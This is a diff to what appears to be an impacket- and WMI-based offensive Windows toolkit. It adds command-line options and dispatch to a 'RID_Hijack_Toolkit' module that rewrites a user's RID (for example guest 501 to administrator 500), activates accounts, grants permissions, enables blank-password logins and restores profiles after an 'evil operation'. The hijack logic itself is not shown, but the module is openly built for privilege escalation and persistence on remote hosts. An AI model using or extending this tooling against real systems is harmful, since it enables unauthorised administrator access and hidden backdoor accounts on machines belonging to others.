@@ -10,10 +10,47 @@ import logging
 from lib.helpers import get_vbs
 from lib.methods.executeScript import executeScript_Toolkit
 from lib.modules.exec_command import EXEC_COMMAND
+from lib.module_base import ModuleBase
 from impacket.dcerpc.v5.dtypes import NULL
 
 
-class RID_Hijack_Toolkit():
+class RID_Hijack_Toolkit(ModuleBase):
+    name = "rid-hijack"
+    description = "RID Hijack."
+
+    @staticmethod
+    def register_parser(subparsers):
+        p = subparsers.add_parser(RID_Hijack_Toolkit.name, help=RID_Hijack_Toolkit.description)
+        p.add_argument("-query", action="store_true", help="Query all users.")
+        p.add_argument("-user", action="store", help="Specify users RID which you want to playing with.(Like guest user 501)")
+        p.add_argument("-hijack-rid", action="store", help="Specify RID which you want to hijack to.(Like administrator rid 500)")
+        p.add_argument("-action", action="store", choices=["hijack", "activate", "deactivate", "grant", "grant-old", "backup", "remove"], help="Action you want to do.")
+        p.add_argument("-blank-pass-login", action="store", choices=["enable", "disable"], help="Enable or disable blank pass login.(for guest user)")
+        p.add_argument("-restore", action="store", help="Restore user profile after you want to do evil operation, need to specify the backup json file)")
+        return p
+
+    @staticmethod
+    def run(iWbemLevel1Login, dcom, options, **kwargs):
+        addr = kwargs.get("addr", "")
+        username = kwargs.get("username", "")
+        toolkit = RID_Hijack_Toolkit(iWbemLevel1Login, dcom)
+        toolkit.timeout = options.timeout
+        if options.query:
+            toolkit.query_user()
+        if options.action and options.user:
+            if options.action == "hijack" and options.hijack_rid:
+                toolkit.hijack(options.action, options.user, options.hijack_rid)
+            elif options.action in ["activate", "deactivate", "remove"]:
+                toolkit.hijack(options.action, options.user)
+            elif options.action in ["grant", "grant-old"]:
+                toolkit.Permissions_Controller(options.action, options.user, username)
+            elif options.action == "backup":
+                toolkit.hijack(options.action, options.user, hostname=addr)
+        if options.blank_pass_login:
+            toolkit.BlankPasswordLogin(options.blank_pass_login)
+        if options.restore:
+            toolkit.restore_UserProfile(options.restore)
+
     def __init__(self, iWbemLevel1Login, dcom):
         self.iWbemLevel1Login = iWbemLevel1Login
         self.dcom = dcom
